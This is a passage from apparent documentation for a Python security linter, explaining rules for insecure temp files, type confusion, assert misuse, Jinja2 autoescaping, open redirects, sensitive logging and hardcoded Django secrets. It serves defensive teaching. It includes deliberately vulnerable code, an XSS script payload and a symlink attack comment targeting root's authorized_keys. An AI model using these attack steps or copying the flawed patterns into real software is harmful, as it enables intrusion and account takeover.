file.</p>"},{"location":"rule/CSP-D505/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>You should only suppress this finding if you are intentionally creating a file that needs to be writable by all users, such as a file in a shared <code>/tmp</code> directory for inter-process communication, and you have assessed that the risks of tampering are low or mitigated in another way.</p> <pre><code># This file is a temporary IPC mechanism and is designed to be world-writable.\n# The data written to it is not sensitive and is validated on read.\n# ignore\nos.chmod(ipc_file, 0o666)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D505\nos.chmod(ipc_file, 0o666)\n</code></pre>"},{"location":"rule/CSP-D506/","title":"CSP-D506: Insecure Temporary File Creation with <code>os.tempnam</code> or <code>os.tmpnam</code>","text":"<p>Vulnerability Category: <code>Filesystem</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D506/#description","title":"Description","text":"<p>This rule flags the use of <code>os.tempnam()</code> and <code>os.tmpnam()</code>. These functions are insecure for the same reason as <code>tempfile.mktemp()</code> (see CSP-D504): they generate a temporary filename but do not create the file, leading to a Time-of-Check to Time-of-Use (TOCTOU) race condition.</p> <p>An attacker can observe the predictable temporary filename and create a symbolic link at that path before the application opens the file. This can lead to the application overwriting sensitive system files.</p> <p>Both <code>os.tempnam()</code> and <code>os.tmpnam()</code> have been deprecated since Python 2.3 and will raise a <code>RuntimeWarning</code>. They should never be used.</p>"},{"location":"rule/CSP-D506/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import os\n\n# os.tempnam() returns a path to a file that does not yet exist.\n# This is a race condition waiting to happen.\ntmp_path = os.tempnam('/tmp', 'myapp_')\n\n# Attacker can create a symlink:\n# ln -s /root/.ssh/authorized_keys /tmp/myapp_...\n\n# The application, thinking it's writing to a temp file,\n# will now overwrite the root user's authorized_keys file.\nwith open(tmp_path, 'w') as f:\n    f.write('ssh-rsa AAAA... attacker@key')\n</code></pre>"},{"location":"rule/CSP-D506/#safe-code-example","title":"Safe Code Example","text":"<p>Always use the modern <code>tempfile</code> module to create temporary files and directories. These functions create the file/directory atomically, preventing race conditions.</p>"},{"location":"rule/CSP-D506/#using-namedtemporaryfile","title":"Using <code>NamedTemporaryFile</code>","text":"<p>This is a convenient, high-level approach that handles cleanup automatically.</p> <pre><code>import tempfile\n\n# Creates a file that is automatically deleted when the 'with' block exits.\n# There is no race condition.\nwith tempfile.NamedTemporaryFile(mode='w', dir='/tmp', prefix='myapp_') as tmp:\n    print(f\"Created secure temporary file: {tmp.name}\")\n    tmp.write('This is safe and will be cleaned up.')\n</code></pre>"},{"location":"rule/CSP-D506/#using-mkstemp","title":"Using <code>mkstemp()</code>","text":"<p>This is a lower-level function that returns a file descriptor and path. You are responsible for cleanup.</p> <pre><code>import tempfile\nimport os\n\n# Creates the file securely and returns a handle and path.\nfd, path = tempfile.mkstemp(dir='/tmp', prefix='myapp_')\n\ntry:\n    with os.fdopen(fd, 'w') as tmp:\n        tmp.write('This is also safe.')\nfinally:\n    # You must remove the file yourself.\n    os.remove(path)\n</code></pre>"},{"location":"rule/CSP-D506/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>There is no valid reason to use <code>os.tempnam</code> or <code>os.tmpnam</code>. These functions are fundamentally insecure and have been deprecated for over a decade. You should always migrate to the <code>tempfile</code> module.</p> <p>If you are analyzing legacy code that cannot be changed, you can suppress the warning, but it is critical to understand that a security risk remains.</p> <pre><code># This code is for a legacy system and cannot be altered.\n# The security risk is acknowledged.\n# ignore\ntmp_path = os.tempnam()\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D506\ntmp_path = os.tmpnam()\n</code></pre>"},{"location":"rule/CSP-D601/","title":"CSP-D601: Type-Based Method Misuse","text":"<p>Vulnerability Category: <code>Type Safety</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D601/#description","title":"Description","text":"<p>This rule identifies a specific and dangerous type of logic error where a method is called on a variable that has a different type than expected. This often happens in dynamically typed languages like Python where a variable's type can change during its lifecycle.</p> <p>While this might seem like a simple bug, it can have severe security consequences. If a variable that is expected to be a safe, custom object is replaced with a basic type like a string or a list, subsequent method calls can fail in unexpected ways or, in some cases, have unintended side effects.</p> <p>This is a form of type confusion, where the program's logic proceeds with incorrect assumptions about the data it is processing. CytoScnPy's type inference engine tracks the possible types of a variable and flags when a method call is impossible for a given type, which is a strong indicator of such a flaw.</p>"},{"location":"rule/CSP-D601/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<p>Consider a function that processes a user profile object.</p> <p><pre><code>class UserProfile:\n    def __init__(self, username, permissions):\n        self.username = username\n        self.permissions = permissions\n\n    def has_permission(self, perm):\n        return perm in self.permissions\n\ndef grant_access(user):\n    # This check is intended to work on a UserProfile object.\n    if user.has_permission(\"admin\"):\n        print(\"Admin access granted.\")\n    else:\n        print(\"Standard access granted.\")\n\n# --- Later, in a different part of the code ---\n\n# A developer mistakenly passes a username (a string) instead of the user object.\n# The type of 'user' has changed from UserProfile to str.\nuser_object = UserProfile(\"alice\", [\"read\"])\ncurrent_user = user_object.username # Mistake: should be current_user = user_object\n\n# When grant_access is called, it will crash with an AttributeError\n# because a string has no 'has_permission' method.\ntry:\n    grant_access(current_user)\nexcept AttributeError as e:\n    print(f\"Caught an error: {e}\")\n</code></pre> In this case, the error prevents the access check from completing, which might lead to a denial of service. In other, more complex scenarios, the type confusion could lead to logic bypasses. For example, if the check was <code>if user and user.is_active</code>, and <code>user</code> was an empty list <code>[]</code> instead of a <code>User</code> object, the check might fail unexpectedly.</p>"},{"location":"rule/CSP-D601/#how-cytoscnpy-detects-this","title":"How CytoScnPy Detects This","text":"<p>CytoScnPy analyzes the code and determines that the <code>current_user</code> variable holds a string. When it sees the call <code>grant_access(current_user)</code>, it knows that inside <code>grant_access</code>, the <code>user</code> parameter will be a string. It then flags the <code>user.has_permission(\"admin\")</code> call as a <code>CSP-D601</code> violation because the <code>str</code> type has no <code>has_permission</code> method.</p>"},{"location":"rule/CSP-D601/#safe-code-example","title":"Safe Code Example","text":"<p>The solution is to ensure that variables retain their expected types. This can be achieved through careful coding and, more robustly, by using static type annotations and a type checker like Mypy.</p> <pre><code>from typing import List\n\nclass UserProfile:\n    def __init__(self, username: str, permissions: List[str]):\n        self.username = username\n        self.permissions = permissions\n\n    def has_permission(self, perm: str) -&gt; bool:\n        return perm in self.permissions\n\n# Using type hints makes the expected type clear.\ndef grant_access(user: UserProfile):\n    if user.has_permission(\"admin\"):\n        print(\"Admin access granted.\")\n    else:\n        print(\"Standard access granted.\")\n\nuser_object = UserProfile(\"alice\", [\"read\"])\n# The code now correctly passes the object, not just the username.\ncurrent_user: UserProfile = user_object\n\ngrant_access(current_user)\n</code></pre>"},{"location":"rule/CSP-D601/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>This finding indicates a definite bug or logic flaw in your code that should be fixed. It is not a matter of style or risk assessment. You should correct the type confusion rather than suppress the warning. If you must suppress it, you can use the standard ignore comments.</p> <pre><code># This is known to be incorrect but cannot be fixed right now.\n# ignore: CSP-D601\ngrant_access(current_user) # where current_user is a string\n</code></pre>"},{"location":"rule/CSP-D701/","title":"CSP-D701: Use of <code>assert</code> for Non-Debug Checks","text":"<p>Vulnerability Category: <code>Best Practices</code></p> <p>Severity: <code>LOW</code></p>"},{"location":"rule/CSP-D701/#description","title":"Description","text":"<p>This rule flags the use of Python's <code>assert</code> statement for checks that are intended to be executed in production. The <code>assert</code> statement is primarily intended for debugging and development. When Python is run with the optimization flag (<code>-O</code> or <code>-OO</code>), all <code>assert</code> statements are removed from the compiled bytecode.</p> <p>If an <code>assert</code> statement is used to enforce a security invariant or a critical business logic condition that must always be met, its removal in an optimized environment can lead to unexpected behavior, crashes, or even security vulnerabilities.</p>"},{"location":"rule/CSP-D701/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>def get_user_data(user_id):\n    # This check is crucial for security: ensure we don't process invalid IDs.\n    # However, if run with python -O script.py, this assertion will be removed.\n    assert isinstance(user_id, int) and user_id &gt; 0, \"Invalid user ID provided\"\n\n    # ... proceed to fetch user data ...\n    # If user_id was accidentally passed as None or a negative number,\n    # the subsequent code might behave unexpectedly or crash.\n    print(f\"Fetching data for user ID: {user_id}\")\n</code></pre>"},{"location":"rule/CSP-D701/#safe-code-example","title":"Safe Code Example","text":"<p>For any check that must be enforced regardless of optimization level, use an <code>if</code> statement with an explicit <code>raise</code> statement. This ensures the check remains active even when Python is run with optimization flags.</p> <pre><code>def get_user_data(user_id):\n    # Use an explicit if statement to raise an exception for invalid input.\n    if not (isinstance(user_id, int) and user_id &gt; 0):\n        raise ValueError(\"Invalid user ID provided\")\n\n    # ... proceed to fetch user data ...\n    print(f\"Fetching data for user ID: {user_id}\")\n</code></pre>"},{"location":"rule/CSP-D701/#when-are-assert-statements-appropriate","title":"When are <code>assert</code> statements appropriate?","text":"<p><code>assert</code> statements are perfectly fine for: - Debugging: Checking internal invariants during development. - Validating conditions that should never be false: If an <code>assert</code> failing means there's a fundamental bug in your own code that would crash the program anyway, its removal might be acceptable. - Input validation that is only for development/debugging: Ensuring that arguments passed to internal functions are correct during testing.</p> <p>The key is that the check should not be relied upon for production security or critical logic.</p>"},{"location":"rule/CSP-D701/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you are using <code>assert</code> for its intended purpose (debugging or internal invariant checks) and not for critical production logic, you can suppress this warning.</p> <pre><code># This assert is for debugging purposes only.\n# ignore\nassert x is not None, \"x should never be None here during debugging\"\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D701\nassert some_complex_condition, \"This condition must hold during development\"\n</code></pre>"},{"location":"rule/CSP-D702/","title":"CSP-D702: Import of Insecure or Deprecated Modules","text":"<p>Vulnerability Category: <code>Best Practices</code></p> <p>Severity: <code>HIGH</code> / <code>LOW</code> (depending on module)</p>"},{"location":"rule/CSP-D702/#description","title":"Description","text":"<p>This rule flags the import of modules that are known to be insecure, deprecated, or pose significant security risks. Using these modules can inadvertently introduce vulnerabilities into an application.</p> <p>Common examples include:</p> <ul> <li><code>telnetlib</code>: Transmits data in cleartext, making it vulnerable to sniffing. Use SSH (<code>paramiko</code>) instead (CSP-D409).</li> <li><code>ftplib</code>: Transmits data and credentials in cleartext. Use SFTP (<code>paramiko</code>) or FTPS (<code>ftplib.FTP_TLS</code>) instead (CSP-D406).</li> <li><code>xml.etree.ElementTree</code>, <code>xml.dom.minidom</code>, <code>xml.sax</code>: These standard libraries can be vulnerable to XML External Entity (XXE) attacks if parsing untrusted input. Use <code>defusedxml</code> instead (CSP-D104).</li> <li><code>pickle</code>: Can lead to arbitrary code execution when deserializing untrusted data. Use JSON or <code>safe_load</code> for YAML instead (CSP-D201).</li> <li><code>yaml.load</code> without <code>Loader</code>: Vulnerable to code execution. Use <code>yaml.safe_load</code> (CSP-D202).</li> <li><code>os.tempnam</code>, <code>os.tmpnam</code>: Insecure for temporary file creation due to race conditions. Use <code>tempfile</code> module instead (CSP-D506).</li> <li><code>subprocess</code> with <code>shell=True</code>: Vulnerable to command injection. Pass arguments as a list instead (CSP-D003).</li> </ul> <p>The severity varies depending on the module; for example, importing <code>telnetlib</code> is a higher risk than importing a module that is merely deprecated but not inherently insecure.</p>"},{"location":"rule/CSP-D702/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code># Importing insecure modules for network communication\nimport telnetlib\nimport ftplib\n\n# Importing a module that can lead to code execution if used insecurely\nimport pickle\n\n# Importing modules that are not secure for XML parsing\nimport xml.etree.ElementTree as ET\n</code></pre>"},{"location":"rule/CSP-D702/#safe-code-example","title":"Safe Code Example","text":"<p>Replace insecure modules with their secure and modern alternatives.</p> <pre><code># Secure alternatives for network communication\nimport requests # For HTTP\nimport paramiko # For SSH/SFTP\n\n# Secure data serialization\nimport json\n\n# Secure XML parsing\nimport defusedxml.ElementTree as ET\n\n# Secure temporary file handling\nimport tempfile\n\n# Secure subprocess execution\nimport subprocess\n</code></pre>"},{"location":"rule/CSP-D702/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you are absolutely required to use a legacy or insecure module for compatibility reasons with an external system, and you have performed a thorough risk assessment, you may suppress the finding.</p> <pre><code># This import is required to communicate with a legacy device that only supports FTP.\n# The network is isolated and credentials are not being sent.\n# ignore\nimport ftplib\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D702\nimport telnetlib\n</code></pre>"},{"location":"rule/CSP-D703/","title":"CSP-D703: Jinja2 Autoescaping Disabled","text":"<p>Vulnerability Category: <code>Best Practices</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D703/#description","title":"Description","text":"<p>This rule flags Jinja2 environments that have autoescaping disabled (<code>autoescape=False</code>). Jinja2 is a popular templating engine for Python. By default, it automatically escapes special HTML characters in variables rendered into templates. This behavior is crucial for preventing Cross-Site Scripting (XSS) attacks, as it ensures that any user-provided HTML or JavaScript is rendered as literal text rather than being executed by the browser.</p> <p>Disabling autoescaping (<code>autoescape=False</code>) means that all variables rendered into the template will be inserted verbatim. If any of these variables contain untrusted user input, it can lead to an XSS vulnerability.</p>"},{"location":"rule/CSP-D703/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>from jinja2 import Environment, FileSystemLoader, Template\n\n# Disabling autoescaping for the entire environment.\n# This is a dangerous practice if any of the templates render user input.\nenv = Environment(loader=FileSystemLoader('/templates'), autoescape=False)\n\n# Assume 'user_comment' comes from user input.\nuser_comment = \"&lt;script&gt;alert('XSS attack!')&lt;/script&gt;\"\n\n# If this template is rendered, the script will execute in the user's browser.\ntemplate = env.from_string(\"&lt;div&gt;{{ comment }}&lt;/div&gt;\")\nrendered_html = template.render(comment=user_comment)\n</code></pre>"},{"location":"rule/CSP-D703/#safe-code-example","title":"Safe Code Example","text":"<p>Ensure that autoescaping is enabled for your Jinja2 environment, or explicitly enable it for specific templates or variables.</p>"},{"location":"rule/CSP-D703/#enabling-autoescaping-by-default","title":"Enabling Autoescaping by Default","text":"<p>The recommended approach is to set <code>autoescape=True</code> when creating the Jinja2 <code>Environment</code>. You can also specify which file extensions should be autoescaped.</p> <pre><code>from jinja2 import Environment, FileSystemLoader\n\n# Autoescaping is enabled by default for HTML, XML, and CSS.\n# You can explicitly set it or rely on Jinja2's defaults.\nenv = Environment(\n    loader=FileSystemLoader('/templates'),\n    autoescape=True # Or rely on Jinja2's default which is True for .html\n)\n\nuser_comment = \"&lt;script&gt;alert('XSS attack!')&lt;/script&gt;\"\n\n# Even though autoescape is on, Jinja2 will automatically escape `user_comment`.\ntemplate = env.from_string(\"&lt;div&gt;{{ comment }}&lt;/div&gt;\")\nrendered_html = template.render(comment=user_comment)\n# The output will be: &lt;div&gt;&amp;lt;script&amp;gt;alert('XSS attack!')&amp;lt;/script&amp;gt;&lt;/div&gt;\n</code></pre>"},{"location":"rule/CSP-D703/#explicitly-escaping-or-marking-safe","title":"Explicitly Escaping or Marking Safe","text":"<p>If you must disable autoescaping for a specific template or need to render HTML content that you've safely escaped or generated, you can control it more granularly.</p> <pre><code>from jinja2 import Environment, Template\n\n# If you MUST disable autoescape for a specific template:\n# NEVER do this with user-controlled data.\ntemplate_string = \"&lt;div&gt;{{ comment }}&lt;/div&gt;\"\ntemplate = Template(template_string, autoescape=False) # Explicitly disabled for this template\n\n# If you have trusted HTML that you want to render UNSAFELY (use with extreme caution):\nfrom jinja2 import Markup\ntrusted_html = \"&lt;b&gt;This is safe HTML&lt;/b&gt;\"\nrendered_unsafe = template.render(comment=Markup(trusted_html)) # Mark as safe\n\n# If you have user input that you have securely sanitized (e.g. with bleach)\n# and want to render it as HTML:\n# import bleach\n# safe_user_html = bleach.clean(user_input_html)\n# rendered_safe_user_html = template.render(comment=Markup(safe_user_html))\n</code></pre>"},{"location":"rule/CSP-D703/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you have explicitly disabled autoescaping for a specific reason (e.g., you are rendering pure, trusted HTML or have sanitized the input using a library like <code>bleach</code> and are marking it safe), you can suppress this finding.</p> <pre><code>from jinja2 import Environment, Markup\n\n# The environment has autoescape=False, but the specific content is trusted.\n# ignore\nenv = Environment(autoescape=False)\nsafe_html_content = Markup(\"&lt;p&gt;This is trusted HTML.&lt;/p&gt;\")\ntemplate = env.from_string(\"&lt;div&gt;{{ content }}&lt;/div&gt;\")\nrendered = template.render(content=safe_html_content)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D703\nenv = Environment(autoescape=False)\n</code></pre>"},{"location":"rule/CSP-D704/","title":"CSP-D704: Call to Blacklisted Function","text":"<p>Vulnerability Category: <code>Best Practices</code></p> <p>Severity: <code>LOW</code> to <code>MEDIUM</code></p>"},{"location":"rule/CSP-D704/#description","title":"Description","text":"<p>This rule flags the use of functions that are considered unsafe or inappropriate for production environments. These are often debugging tools or functions that could have unintended side effects if left in production code.</p> <p>Common examples of blacklisted functions include:</p> <ul> <li><code>pdb.set_trace()</code>: An interactive Python debugger. If this is called in production, it will halt execution and expose an interactive debugging shell.</li> <li><code>print()</code> statements (sometimes): Excessive or sensitive information logged via <code>print</code> can leak data in production.</li> <li><code>eval()</code> or <code>exec()</code>: (See CSP-D001 and CSP-D002) While not always blacklisted, their use can be flagged if they are deemed too risky for the context.</li> <li>Legacy or insecure functions: Such as <code>os.tempnam()</code> (CSP-D506) or <code>telnetlib.Telnet()</code> (CSP-D409), which are covered by specific rules but might also be caught here as general blacklisted items.</li> </ul> <p>Leaving such functions in production code can lead to information disclosure, denial of service, or even remote code execution.</p>"},{"location":"rule/CSP-D704/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>import pdb\nimport os\n\ndef process_data(data):\n    # Debugger set during development\n    pdb.set_trace()\n\n    result = os.system(f\"echo {data}\") # Example of a potentially dangerous call\n    return result\n\n# In production, calling process_data might halt execution and expose the debugger.\n</code></pre>"},{"location":"rule/CSP-D704/#safe-code-example","title":"Safe Code Example","text":"<p>Remove all debugging statements and blacklisted functions before deploying to production. Ensure that only essential, production-ready code is present.</p> <pre><code>def process_data(data):\n    # Debugger removed for production\n    # pdb.set_trace()\n\n    # Use safer alternatives for shell commands if possible,\n    # or ensure strict validation if shell=True is unavoidable.\n    # For this example, let's assume we use a safer subprocess call or\n    # a different, secure method.\n    # result = subprocess.run(['echo', data], capture_output=True, text=True)\n\n    # Simplified for example: replace with safe logic.\n    print(f\"Processing data: {data}\")\n    return True\n</code></pre>"},{"location":"rule/CSP-D704/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If a blacklisted function is intentionally used in production for a specific, justified reason (e.g., an auditing tool that needs to log verbose information, or a controlled debugging endpoint in a secure environment), you can suppress the finding with a comment. However, this is rare and should be done with extreme caution.</p> <pre><code># This print statement is part of an internal security audit logging mechanism.\n# ignore\nprint(f\"Security event logged: {event_details}\")\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D704\npdb.set_trace() # Intentionally included for a specific debugging scenario\n</code></pre>"},{"location":"rule/CSP-D801/","title":"CSP-D801: Open Redirect","text":"<p>Vulnerability Category: <code>Open Redirect</code></p> <p>Severity: <code>HIGH</code></p>"},{"location":"rule/CSP-D801/#description","title":"Description","text":"<p>An Open Redirect vulnerability occurs when a web application redirects users to a URL that is supplied by an untrusted input, without proper validation. The attacker can craft a URL that includes a malicious redirect target, such as a phishing site or a site that exploits browser vulnerabilities.</p> <p>When a user clicks on a malicious link, they may be redirected to a site that appears to be legitimate (e.g., <code>https://your-trusted-app.com/redirect?url=https://malicious-site.com</code>) but is actually controlled by an attacker. This can be used to trick users into divulging sensitive information or performing unwanted actions.</p>"},{"location":"rule/CSP-D801/#vulnerable-code-example-flask","title":"Vulnerable Code Example (Flask)","text":"<pre><code>from flask import Flask, redirect, request, url_for\n\napp = Flask(__name__)\n\n@app.route('/redirect_user')\ndef redirect_user():\n    # The 'next' parameter is taken directly from user input.\n    next_url = request.args.get('next')\n\n    if next_url:\n        # VULNERABLE: The application redirects to an unvalidated URL.\n        # An attacker could provide 'next=https://phishing-site.com'\n        return redirect(next_url)\n    else:\n        # Redirect to a safe default if 'next' is not provided.\n        return redirect(url_for('index'))\n\n@app.route('/')\ndef index():\n    return \"Welcome!\"\n\nif __name__ == '__main__':\n    app.run(debug=True)\n</code></pre>"},{"location":"rule/CSP-D801/#safe-code-example","title":"Safe Code Example","text":"<p>To prevent open redirects, always validate user-supplied URLs before performing a redirect. This typically involves: 1.  Whitelisting allowed domains: Only permit redirects to domains that are explicitly on a trusted list. 2.  Ensuring relative paths: If redirects are only meant for internal application URLs, ensure the provided URL is a relative path and not an absolute URL. 3.  Providing a safe default: Always redirect to a known safe page if the provided URL is invalid or missing.</p> <pre><code>from flask import Flask, redirect, request, url_for\nfrom urllib.parse import urlparse, urljoin\n\napp = Flask(__name__)\n\n# Whitelist of domains that are allowed for redirection.\n# This should include your own application's domain(s).\nALLOWED_REDIRECT_HOSTS = ['127.0.0.1:5000', 'your-trusted-app.com']\n\ndef is_safe_redirect_url(target):\n    \"\"\"\n    Checks if the target URL is safe for redirection.\n    It must be relative or point to a host in our ALLOWED_REDIRECT_HOSTS.\n    \"\"\"\n    if not target:\n        return False\n\n    # Check if it's an absolute URL and if its host is in the allowed list.\n    parsed_target = urlparse(target)\n\n    # If scheme or netloc are present, it's an absolute URL.\n    # If netloc is empty, it's a relative path.\n    if parsed_target.scheme and parsed_target.netloc:\n        return parsed_target.netloc in ALLOWED_REDIRECT_HOSTS\n    elif not parsed_target.scheme and not parsed_target.netloc:\n        # It's a relative path, which is generally safe.\n        return True\n    else:\n        # Other cases like 'http://' or 'https://' without a host are invalid.\n        return False\n\n@app.route('/redirect_user')\ndef redirect_user():\n    next_url = request.args.get('next')\n\n    # Validate the URL before redirecting.\n    if next_url and is_safe_redirect_url(next_url):\n        return redirect(next_url)\n    else:\n        # Redirect to a safe default page if validation fails.\n        return redirect(url_for('index'))\n\n@app.route('/')\ndef index():\n    return \"Welcome!\"\n\nif __name__ == '__main__':\n    app.run(debug=True)\n</code></pre>"},{"location":"rule/CSP-D801/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>This is a critical security vulnerability and should generally not be suppressed. If you have implemented very strict, custom validation logic that is guaranteed to prevent all open redirect attacks, you might suppress it.</p> <pre><code># The redirect URL is validated using a custom, secure logic.\n# ignore\nreturn redirect(validated_url)\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D801\nreturn redirect(validated_url)\n</code></pre>"},{"location":"rule/CSP-D901/","title":"CSP-D901: Logging of Sensitive Data","text":"<p>Vulnerability Category: <code>Privacy</code></p> <p>Severity: <code>MEDIUM</code></p>"},{"location":"rule/CSP-D901/#description","title":"Description","text":"<p>This rule flags instances where sensitive information is logged to console output or log files. Logging sensitive data, such as passwords, API keys, session tokens, Personally Identifiable Information (PII), or financial details, can lead to data breaches if log files are compromised or accessed by unauthorized personnel.</p> <p>Even if logs are generally secured, accidental exposure or misconfiguration can expose this data. It is a best practice to avoid logging sensitive information altogether.</p>"},{"location":"rule/CSP-D901/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<p><pre><code>import logging\nimport secrets\n\n# Setup logging\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(__name__)\n\nuser_id = 12345\napi_key = secrets.token_hex(16) # Generate a random API key\npassword = \"thisIsASecurePassword123!\" # A real password should never be used directly\n\n# Logging sensitive information directly\nlogger.info(f\"User ID: {user_id}, API Key: {api_key}, Password: {password}\")\nlogger.warning(\"Processing sensitive data for user %s\", user_id)\n</code></pre> In this example, the <code>api_key</code> and <code>password</code> are logged, which is a security risk.</p>"},{"location":"rule/CSP-D901/#safe-code-example","title":"Safe Code Example","text":"<p>Sensitive information should never be logged directly. If you need to log information about a user or a transaction, redact or mask the sensitive fields.</p> <pre><code>import logging\nimport secrets\n\n# Setup logging\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(__name__)\n\nuser_id = 12345\napi_key = secrets.token_hex(16)\npassword_plaintext = \"thisIsASecurePassword123!\" # Never log the plaintext password\n\n# Masking sensitive data before logging\n# Redact the API Key and Password\nmasked_api_key = api_key[:4] + \"****\" + api_key[-4:]\nmasked_password = \"*\" * len(password_plaintext)\n\nlogger.info(f\"User ID: {user_id}, API Key: {masked_api_key}, Password: {masked_password}\")\nlogger.warning(\"Processing sensitive data for user %s\", user_id)\n</code></pre>"},{"location":"rule/CSP-D901/#best-practices-for-logging-sensitive-data","title":"Best Practices for Logging Sensitive Data","text":"<ul> <li>Avoid Logging: The best approach is to not log sensitive data at all. If you must log information related to a sensitive field, log only what is necessary for debugging or auditing, and ensure it's anonymized or masked.</li> <li>Redact/Mask: Replace sensitive parts of the data with placeholders like <code>****</code> or a fixed string (e.g., <code>[REDACTED]</code>).</li> <li>Hash (for secrets): If you need to log an identifier related to a secret (e.g., the first 4 and last 4 characters of an API key), hash the full secret first, then log the hash along with the non-sensitive parts of the identifier.</li> <li>Configuration: Use configuration settings to control logging levels and what information is logged, allowing sensitive logging to be turned off in production.</li> <li>Log Rotation and Access Control: Ensure that log files themselves are stored securely with appropriate access controls and rotation policies.</li> </ul>"},{"location":"rule/CSP-D901/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you have implemented robust sanitization or masking for the sensitive data before it's logged, or if the logging is part of a secure, internal audit mechanism that is strictly controlled, you may suppress this finding.</p> <pre><code># The API key is masked before logging.\n# ignore\nlogger.info(f\"API Key used: {mask_sensitive_data(api_key)}\")\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D901\nlogger.info(\"Password processed: %s\", \"[REDACTED]\")\n</code></pre>"},{"location":"rule/CSP-D902/","title":"CSP-D902: Hardcoded Django <code>SECRET_KEY</code>","text":"<p>Vulnerability Category: <code>Privacy</code></p> <p>Severity: <code>CRITICAL</code></p>"},{"location":"rule/CSP-D902/#description","title":"Description","text":"<p>This rule flags the hardcoding of Django's <code>SECRET_KEY</code> directly within the source code. The <code>SECRET_KEY</code> is a crucial security setting for Django projects. It is used to cryptographically sign information, like session cookies, and is essential for ensuring the integrity and authenticity of data.</p> <p>If the <code>SECRET_KEY</code> is hardcoded and committed to a version control system (like Git), it becomes exposed to anyone who can access the codebase. An attacker who obtains the <code>SECRET_KEY</code> can: - Forge session cookies: Impersonate logged-in users. - Tamper with data: Modify signed data, such as password reset tokens. - Potentially compromise the entire application: Depending on how the secret is used, it might be possible to gain unauthorized access or execute malicious code.</p>"},{"location":"rule/CSP-D902/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<p><pre><code># settings.py\nSECRET_KEY = 'django-insecure-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'\n# ... other settings ...\n</code></pre> Committing this <code>settings.py</code> file to a public repository or sharing it would expose the <code>SECRET_KEY</code>.</p>"},{"location":"rule/CSP-D902/#safe-code-example","title":"Safe Code Example","text":"<p>The <code>SECRET_KEY</code> should never be hardcoded. Instead, it should be loaded from environment variables or a secure configuration management system. This ensures the secret is not present in the codebase and can be managed securely in different environments (development, staging, production).</p>"},{"location":"rule/CSP-D902/#using-environment-variables","title":"Using Environment Variables","text":"<p>1. In <code>settings.py</code>: <pre><code>import os\n\n# Load the secret key from an environment variable.\n# Provide a default for local development if the variable is not set.\nSECRET_KEY = os.environ.get('DJANGO_SECRET_KEY', 'django-insecure-default-for-local-dev-only')\n\n# If DJANGO_SECRET_KEY is not set, Django will issue a warning.\n# For production, it's essential that DJANGO_SECRET_KEY is set externally.\n</code></pre></p> <p>2. Setting the environment variable:</p> <ul> <li>On Linux/macOS (in your shell): <pre><code>export DJANGO_SECRET_KEY='your-super-secret-key-for-production'\npython manage.py runserver\n</code></pre></li> <li>On Windows (cmd): <pre><code>set DJANGO_SECRET_KEY=your-super-secret-key-for-production\npython manage.py runserver\n</code></pre></li> <li>Using <code>.env</code> files (with <code>python-dotenv</code>):     Install: <code>pip install python-dotenv</code>     Create a <code>.env</code> file in your project root:     <pre><code>DJANGO_SECRET_KEY=your-super-secret-key-for-production\n</code></pre>     In your <code>settings.py</code> or a startup script:     <pre><code>from dotenv import load_dotenv\nload_dotenv() # Load variables from .env file\n# ... then os.environ.get('DJANGO_SECRET_KEY', ...) will work\n</code></pre></li> </ul>"},{"location":"rule/CSP-D902/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>You should never hardcode your <code>SECRET_KEY</code>. If this finding appears, it means you have a vulnerability that needs immediate attention. Suppressing this finding is highly discouraged and should only be done if you've already moved the secret to an environment variable and the tool is incorrectly flagging an old file or a temporary state.</p> <pre><code># This is a placeholder for local development ONLY and is NOT committed to VCS.\n# The actual secret is loaded from environment variables in production.\n# ignore\nSECRET_KEY = 'django-insecure-default-for-local-dev-only'\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-D902\nSECRET_KEY = 'hardcoded-for-testing-only'\n</code></pre>"},{"location":"rule/CSP-X001/","title":"CSP-X001: Generic Cross-Site Scripting (XSS)","text":"<p>Vulnerability Category: <code>Generic</code> (often detected via Taint Analysis)</p> <p>Severity: <code>CRITICAL</code></p>"},{"location":"rule/CSP-X001/#description","title":"Description","text":"<p>This rule flags potential Cross-Site Scripting (XSS) vulnerabilities that may not be tied to a specific, known framework sink (like <code>mark_safe</code> or <code>eval</code>). These generic XSS findings are typically detected through taint analysis, where untrusted input from a source (e.g., user-supplied data) is found to reach a sink (e.g., an HTML rendering context) without proper sanitization or encoding.</p> <p>XSS vulnerabilities allow attackers to inject malicious client-side scripts into web pages viewed by other users. This can lead to session hijacking, data theft, defacement, or redirecting users to malicious 